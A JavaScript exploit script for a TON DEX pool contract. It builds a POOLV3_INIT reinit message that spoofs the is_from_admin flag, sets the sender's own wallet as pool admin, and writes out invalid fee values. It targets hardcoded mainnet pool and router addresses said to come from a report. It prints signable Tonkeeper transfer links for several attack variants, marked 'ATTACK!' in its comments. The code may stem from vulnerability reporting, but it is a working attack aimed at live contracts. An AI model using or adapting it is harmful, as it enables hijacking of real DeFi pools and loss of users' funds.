const { beginCell, Address, toNano, Cell } = require('@ton/core');

// POOLV3_INIT opcode from SDK
const POOLV3_INIT = 0x441c39ed;
const IMPOSSIBLE_FEE = 10001; // FEE_DENOMINATOR + 1 = 10000 + 1

// Mainnet addresses from the report
const ROUTER_ADDRESS = 'EQC_-t0nCnOFMdp7E7qPxAOCbCWGFz-e3pwxb6tTvFmshjt5';
const POOL_ADDRESS = 'EQD25vStEwc-h1QT1qlsYPQwqU5IiOhox5II0C_xsDNpMVo7';

// Your wallet address - REPLACE WITH YOUR ACTUAL WALLET ADDRESS
const YOUR_WALLET = 'UQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJKZ'; // placeholder

/**
 * Build POOLV3_INIT (reinitMessage) with is_from_admin=1
 * 
 * Based on SDK PoolV3Contract.reinitMessage():
 * 
 * beginCell()
 *   .storeUint(POOLV3_INIT, 32)     // OP code
 *   .storeUint(0, 64)               // query_id
 *   .storeUint(is_from_admin, 1)    // is_from_admin flag
 *   .storeUint(has_admin, 1)        // admin present?
 *   .storeAddress(admin)            // admin address (if has_admin)
 *   .storeUint(has_controller, 1)   // controller present?
 *   .storeAddress(controller)       // controller address (if has_controller)
 *   .storeUint(has_tickSpacing, 1)  // tickSpacing present?
 *   .storeUint(tickSpacing, 24)     // tick spacing
 *   .storeUint(has_sqrtPriceX96, 1) // sqrtPriceX96 present?
 *   .storeUint(sqrtPriceX96, 160)   // sqrt price
 *   .storeUint(has_activate_pool, 1)// activate pool present?
 *   .storeUint(activate_pool, 1)    // activate pool flag
 *   .storeUint(protocolFee, 16)     // protocol fee
 *   .storeUint(lpFee, 16)           // LP fee
 *   .storeUint(currentFee, 16)      // current fee
 *   .storeRef(emptyCell)            // nftContentPacked
 *   .storeRef(emptyCell)            // nftItemContentPacked
 *   .storeMaybeRef(null)            // minterCell (optional)
 *   .endCell();
 */
function buildReinitMessage(adminAddress) {
    const emptyCell = beginCell().endCell();
    
    const body = beginCell()
        .storeUint(POOLV3_INIT, 32)     // OP code
        .storeUint(0, 64)               // query_id
        .storeUint(1, 1)                // is_from_admin = 1 (ATTACK!)
        .storeUint(1, 1)                // has_admin = true
        .storeAddress(adminAddress)     // admin = OUR address!
        .storeUint(0, 1)                // has_controller = false
        .storeUint(0, 1)                // has_tickSpacing = false
        .storeUint(0, 24)               // tickSpacing (default)
        .storeUint(0, 1)                // has_sqrtPriceX96 = false
        .storeUint(0, 160)              // sqrtPriceX96 (default)
        .storeUint(0, 1)                // has_activate_pool = false
        .storeUint(0, 1)                // activate_pool (default)
        .storeUint(IMPOSSIBLE_FEE, 16)  // protocolFee (unchanged)
        .storeUint(IMPOSSIBLE_FEE, 16)  // lpFee (unchanged)
        .storeUint(IMPOSSIBLE_FEE, 16)  // currentFee (unchanged)
        .storeRef(emptyCell)            // nftContentPacked
        .storeRef(emptyCell)            // nftItemContentPacked
        .endCell();
    
    return body;
}

// Generate tonkeeper link
function generateTonkeeperLink(address, amount, body) {
    const bodyBoc = body.toBoc().toString('base64');
    const url = `https://app.tonkeeper.com/transfer/${address}?amount=${amount}&bin=${encodeURIComponent(bodyBoc)}`;
    return url;
}

// Test 1: Minimal attack - just set is_from_admin=1, no admin address change
const bodyMinimal = beginCell()
    .storeUint(POOLV3_INIT, 32)
    .storeUint(0, 64)
    .storeUint(1, 1)  // is_from_admin = 1
    .storeUint(0, 1)  // has_admin = false
    .storeUint(0, 1)  // has_controller = false
    .storeUint(0, 1)  // has_tickSpacing = false
    .storeUint(0, 24)
    .storeUint(0, 1)  // has_sqrtPriceX96 = false
    .storeUint(0, 160)
    .storeUint(0, 1)  // has_activate_pool = false
    .storeUint(0, 1)
    .storeUint(IMPOSSIBLE_FEE, 16)
    .storeUint(IMPOSSIBLE_FEE, 16)
    .storeUint(IMPOSSIBLE_FEE, 16)
    .storeRef(beginCell().endCell())
    .storeRef(beginCell().endCell())
    .endCell();

console.log('=== TEST 1: Minimal POOLV3_INIT with is_from_admin=1 ===');
console.log('Body BoC:', bodyMinimal.toBoc().toString('base64'));
console.log('Link (to POOL):', generateTonkeeperLink(POOL_ADDRESS, toNano('0.15').toString(), bodyMinimal));
console.log('');

// Test 2: Full attack - set admin to our address
// NOTE: Replace YOUR_WALLET with your actual wallet address!
console.log('=== TEST 2: POOLV3_INIT with is_from_admin=1 + admin override ===');
console.log('⚠️  Replace YOUR_WALLET with your actual address before using!');
console.log('');

// Test 3: Send to ROUTER instead of POOL (maybe router forwards it)
console.log('=== TEST 3: Minimal POOLV3_INIT sent to ROUTER ===');
console.log('Link (to ROUTER):', generateTonkeeperLink(ROUTER_ADDRESS, toNano('0.15').toString(), bodyMinimal));
console.log('');

// Decode the body to verify
console.log('=== Body hex dump ===');
console.log('Hex:', bodyMinimal.toBoc().toString('hex'));
console.log('');

// Also show the raw BoC for manual inspection
console.log('=== Raw BoC (base64, not URL-encoded) ===');
console.log(bodyMinimal.toBoc().toString('base64'));